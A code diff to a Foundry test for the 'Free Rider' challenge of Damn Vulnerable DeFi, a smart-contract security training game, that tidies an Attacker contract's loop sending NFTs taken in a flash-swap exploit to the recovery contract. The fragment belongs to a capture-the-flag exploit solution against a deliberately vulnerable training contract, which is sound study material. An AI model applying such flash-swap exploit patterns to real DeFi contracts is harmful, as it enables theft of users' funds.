@@ -168,6 +168,7 @@ contract FreeRider is Test {
             damnValuableNFT.transferFrom(address(freeRiderRecovery), devs, tokenId);
             assertEq(damnValuableNFT.ownerOf(tokenId), devs);
         }
+
         vm.stopPrank();
 
         // Exchange must have lost NFTs and ETH
@@ -247,20 +248,7 @@ contract Attacker is IUniswapV2Callee, IERC721Receiver {
         _weth.transfer(address(_uniswapV2Pair), payback);
 
         for (uint8 i = 0; i < 6;) {
-            _damnValuableNFT.approve(_owner, i);
-
-            bytes memory callData = abi.encodeWithSignature(
-                "safeTransferFrom(address,address,uint256,bytes)",
-                address(this),
-                address(_freeRiderRecovery),
-                i,
-                abi.encode(address(this))
-            );
-
-            (bool success,) = address(_damnValuableNFT).call(callData);
-            if (!success) {
-                revert("Transfer failed");
-            }
+            _damnValuableNFT.safeTransferFrom(address(this), address(_freeRiderRecovery), i, abi.encode(address(this)));
 
             unchecked {
                 ++i;
